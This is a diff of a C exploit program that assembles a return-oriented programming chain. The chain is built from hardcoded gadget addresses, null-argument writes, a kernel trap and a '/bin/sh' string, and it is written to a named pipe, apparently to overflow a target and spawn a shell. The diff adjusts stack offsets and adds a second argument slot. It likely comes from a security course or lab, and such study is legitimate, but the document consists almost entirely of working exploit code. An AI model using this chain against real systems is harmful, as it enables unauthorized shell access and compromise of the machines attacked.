@@ -7,11 +7,12 @@
 
 int main(void)
 {
-  char bufr[200];
+  char bufr[204];
   // bufr address = bfbf671d
-  char null_arg_addr[] = "\xd0\x67\xbf\xbf"; 
-  char shell_addr[] = "\xd4\x67\xbf\xbf";
-  char prev_addr[] = "\xc8\x67\xbf\xbf";
+  char null_arg_addr[] = "\xdc\x67\xbf\xbf"; // bufr + 191
+  char y_addr[] = "\xe0\x67\xbf\xbf"; // bufr + 195
+  char null_arg_addr2[] = "\xe4\x67\xbf\xbf"; // bufr + 199
+  char x_addr[] = "\xe8\x67\xbf\xbf"; // bufr + 203
 
   char trap[] = "\xe5\xb6\xa9\xbb";
 
@@ -46,22 +47,31 @@ int main(void)
   strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
   // pop null args address into ecx
   strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
-  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
+  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf67d0
   // write 4 bytes of null to address in ecx
   strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
-                                             // null arg should be present
+                                             // null arg 1 should be present
+  strcpy(bufr + 163, pop_ecx); // 0xbbbaa422           
+  strcpy(bufr + 167, null_arg_addr2); // = 0xbfbf68a4        
+  // write 4 bytes of null to address in ecx
+  strcpy(bufr + 171, write_at_ecx_from_edx); // 0xbbb6b87e
+
   // trap into kernel
-  strcpy(bufr + 163, trap); // 0xbba9b6e5
+  strcpy(bufr + 175, trap); // 0xbba9b6e5
   // leave 4 bytes for the ret call of trap
-  strcpy(bufr + 167, "\x01\x01\x01\x01");
-  // address of "/bin/sh"
-  strcpy(bufr + 171, shell_addr);
-  // address of prev arg
-  strcpy(bufr + 175, prev_addr);
-  // leave 4 bytes for null arg at bufr + 179
   strcpy(bufr + 179, "\x01\x01\x01\x01");
-  // location of "/bin/sh" bufr + 183
-  strcpy(bufr + 183, "/bin/sh\x00");
+  // address of "/bin/sh"
+  strcpy(bufr + 183, x_addr);
+  // address of y
+  strcpy(bufr + 187, y_addr);
+  // leave 4 bytes for null arg at bufr + 179
+  strcpy(bufr + 191, "\x01\x01\x01\x01");
+  // start of y
+  strcpy(bufr + 195, x_addr);
+  // second null arg
+  strcpy(bufr + 199, "\x01\x01\x01\x01");
+  // location of "/bin/sh"
+  strcpy(bufr + 203, "/bin/sh\x00");
 
   writecmd(PIPEPATH, bufr);
   
